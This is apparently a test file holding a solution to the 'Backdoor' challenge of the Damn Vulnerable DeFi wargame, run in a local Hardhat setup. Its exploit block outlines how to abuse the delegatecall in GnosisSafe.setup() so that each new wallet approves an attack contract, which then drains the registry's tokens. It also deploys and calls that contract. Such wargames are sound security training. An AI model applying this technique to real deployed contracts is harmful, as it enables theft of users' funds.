const { ethers } = require("hardhat")
const { expect } = require("chai")

describe("[Challenge] Backdoor", function () {
    let deployer, users, attacker

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther("40")

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners()
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory("GnosisSafe", deployer)).deploy()
        this.walletFactory = await (
            await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)
        ).deploy()
        this.token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy()

        // Deploy the registry
        this.walletRegistry = await (
            await ethers.getContractFactory("WalletRegistry", deployer)
        ).deploy(this.masterCopy.address, this.walletFactory.address, this.token.address, users)

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be.true
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED)
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */

        /*
        - Create proxy wallets on behalf of each of the owners
        - During creation, call `GnosisSafe.setup()`
            - this function allows a delegatecall to be made
            - make malicious contract to be delegatecalled
                - delegate call `DelegateCallee.approve()`
                - proxy wallet will approve attack contract to spend all of its DVT
        - After proxy wallet creation, simply use `IERC20.transferFrom` to steal DVT tokens
        - Do this for each owner (in one transaction)
        */

        // deploy attack contract
        const owners = [alice.address, bob.address, charlie.address, david.address]
        const AttackFactory = await ethers.getContractFactory("BackdoorAttack", attacker)
        const attackContract = await AttackFactory.deploy(
            this.walletRegistry.address,
            this.walletFactory.address,
            this.masterCopy.address,
            owners,
            this.token.address
        )

        // call attack
        await attackContract.attack()
    })

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i])

            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet")

            // User is no longer registered as a beneficiary
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false
        }

        // Attacker must have taken all tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(AMOUNT_TOKENS_DISTRIBUTED)
    })
})
